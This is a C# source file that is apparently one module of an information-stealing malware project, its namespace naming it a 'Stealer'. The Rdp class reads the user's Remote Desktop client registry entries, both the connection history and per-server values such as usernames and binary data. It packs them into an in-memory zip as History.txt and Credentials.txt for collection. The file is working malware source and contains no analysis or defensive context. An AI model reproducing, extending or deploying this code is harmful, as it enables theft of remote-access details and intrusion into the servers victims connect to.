using IntelXPro.src.IntelXPro.Dependencies.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Rdp : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = "Software\\Microsoft\\Terminal Server Client";
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text);
            if (registryKey == null)
            {
                return;
            }
            string text2 = "Rdp";
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "RDP";
            RegistryKey registryKey2 = registryKey.OpenSubKey("Default");
            if (registryKey2 != null)
            {
                StringBuilder stringBuilder = new StringBuilder();
                string[] valueNames = registryKey2.GetValueNames();
                foreach (string name in valueNames)
                {
                    try
                    {
                        object value = registryKey2.GetValue(name);
                        if (value != null)
                        {
                            stringBuilder.AppendLine(value.ToString());
                        }
                    }
                    catch
                    {
                    }
                }
                if (stringBuilder.Length > 0)
                {
                    string text3 = text2 + "\\History.txt";
                    byte[] bytes = Encoding.UTF8.GetBytes(stringBuilder.ToString() + "\n");
                    zip.AddFile(text3.Replace('\\', '/'), bytes);
                    counterApplications.Files.Add(text + "\\Default => " + text3.Replace('\\', '/'));
                }
            }
            RegistryKey registryKey3 = registryKey.OpenSubKey("Servers");
            if (registryKey3 != null)
            {
                StringBuilder stringBuilder2 = new StringBuilder();
                string[] valueNames = registryKey3.GetSubKeyNames();
                foreach (string text4 in valueNames)
                {
                    try
                    {
                        RegistryKey registryKey4 = registryKey3.OpenSubKey(text4);
                        if (registryKey4 == null)
                        {
                            continue;
                        }
                        stringBuilder2.AppendLine(text4 + ":");
                        string[] valueNames2 = registryKey4.GetValueNames();
                        foreach (string text5 in valueNames2)
                        {
                            try
                            {
                                object value2 = registryKey4.GetValue(text5);
                                if (value2 is byte[] array)
                                {
                                    string text6 = BitConverter.ToString(array).Replace("-", "");
                                    stringBuilder2.AppendLine(text5 + ": " + text6);
                                }
                                else
                                {
                                    stringBuilder2.AppendLine($"{text5}: {value2}");
                                }
                            }
                            catch
                            {
                            }
                        }
                        stringBuilder2.AppendLine();
                    }
                    catch
                    {
                    }
                }
                if (stringBuilder2.Length > 0)
                {
                    string text7 = text2 + "\\Credentials.txt";
                    byte[] bytes2 = Encoding.UTF8.GetBytes(stringBuilder2.ToString());
                    zip.AddFile(text7.Replace('\\', '/'), bytes2);
                    counterApplications.Files.Add(text + "\\Servers => " + text7.Replace('\\', '/'));
                }
            }
            if (counterApplications.Files.Count > 0)
            {
                counterApplications.Files.Add(text2);
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
